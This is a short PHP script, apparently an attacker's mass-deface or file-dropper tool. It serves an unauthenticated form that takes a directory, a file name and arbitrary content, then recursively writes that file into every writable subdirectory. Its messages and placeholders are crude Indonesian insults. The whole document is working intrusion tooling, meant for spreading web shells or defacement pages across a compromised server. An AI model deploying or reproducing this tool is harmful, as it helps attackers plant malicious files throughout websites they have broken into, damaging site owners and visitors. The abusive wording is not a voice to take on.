<?php
function bikin_file($namafile,$script){
$fp2 = fopen($namafile,"w");
fputs($fp2,$script);
}
function buka_dir($getcwd){
	if(is_writable($getcwd)){
	$nama = $_POST['nama'];
	$script = $_POST['script'];
	$a = scandir("$getcwd");
foreach($a as $aa){
	if($aa == "." | $aa == ".."){
	}elseif(is_dir("$getcwd/$aa")){
		$dir_baru = "$getcwd/$aa";
		if(is_writable($dir_baru)){
		echo "$dir_baru/$nama [OK]<br>";
		$create_file = bikin_file("$dir_baru/$nama", "$script");
		$baa = buka_dir($dir_baru);
	}
	else{
		echo "monyet dir nya tidak Writeable tolol";
	}
}
}	
}
else{
	echo "monyet dir nya tidak Writeable tolol";
}
}
if($_POST){
$cwd = $_POST['dir'];
$coba = buka_dir($cwd);
echo $coba;
}
else{
	echo '<html><body><table><tr><td><form method="post" action="?action"></td></tr>
							<tr><td><input type="text" name="dir" placeholder="dirr nya bangsat"></td></tr>
							<tr><td><input type="text" name="nama" placeholder="nama file nyaa, tolol"></td></tr>
							<tr><td><textarea rows="10" cols="19px" name="script" placeholder="bangsat lo anjing"></textarea></td></tr>
							<br><tr><td><input type="submit" value="monyet"></td></tr>
							</form></table></body></html>';
}
?>
